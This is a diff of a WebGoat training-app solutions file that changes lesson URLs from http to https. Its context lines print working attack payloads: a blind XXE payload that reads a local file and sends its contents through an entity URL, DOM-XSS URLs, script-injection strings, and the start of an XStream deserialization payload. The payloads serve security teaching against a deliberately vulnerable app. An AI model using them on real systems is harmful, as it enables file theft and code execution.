@@ -47,14 +47,14 @@ Blind SendFile
       <pre>
           <?xml version="1.0" encoding="UTF-8"?>
           <!ENTITY % file SYSTEM "file:///c:/windows-version.txt">
-          <!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:8080/WebGoat/XXE/ping?text=%file;'>">
+          <!ENTITY % all "<!ENTITY send SYSTEM 'https://localhost:8080/WebGoat/XXE/ping?text=%file;'>">
            %all;
       </pre>
      
       This will be reduced to:
      
       <pre>
-          <!ENTITY send SYSTEM 'http://localhost:8080/WebGoat/XXE/ping?text=[contents_file]'>
+          <!ENTITY send SYSTEM 'https://localhost:8080/WebGoat/XXE/ping?text=[contents_file]'>
       </pre>
      
       Wire it all up in the xml send to the server:
@@ -62,7 +62,7 @@ Blind SendFile
       <pre>
        <?xml version="1.0"?>
        <!DOCTYPE root [
-       <!ENTITY % remote SYSTEM "http://localhost:8080/WebGoat/plugin_lessons/XXE/test.dtd">
+       <!ENTITY % remote SYSTEM "https://localhost:8080/WebGoat/plugin_lessons/XXE/test.dtd">
        %remote;
         ]>
        <user>
@@ -82,10 +82,10 @@ Blind SendFile
 DOM-XSS:  
 
   Something like 
-  `http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&_someVar=234902384lotslsfjdOf9889080GarbageHere%3Cscript%3Ewebgoat.customjs.phoneHome();%3C%2Fscript%3E
+  `https://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&_someVar=234902384lotslsfjdOf9889080GarbageHere%3Cscript%3Ewebgoat.customjs.phoneHome();%3C%2Fscript%3E
 //`   
 OR  
-`http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&_someVar=234902384lotslsfjdOf9889080GarbageHere<script>webgoat.customjs.phoneHome();<%2Fscript>`  
+`https://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&_someVar=234902384lotslsfjdOf9889080GarbageHere<script>webgoat.customjs.phoneHome();<%2Fscript>`  
 
 ### Vuln - Components ###
 
@@ -94,7 +94,7 @@ Jquery page: - it is contrived; but paste that in each box
 OK<script>alert("XSS")<\/script>
 OK<script>alert("XSS")<\/script>
 ```
-for the deserialization:  got to the link: http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/  to read about why it works so you can talk to it.
+for the deserialization:  got to the link: https://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/  to read about why it works so you can talk to it.
 ```html  
 <sorted-set>  
  <string>foo</string>
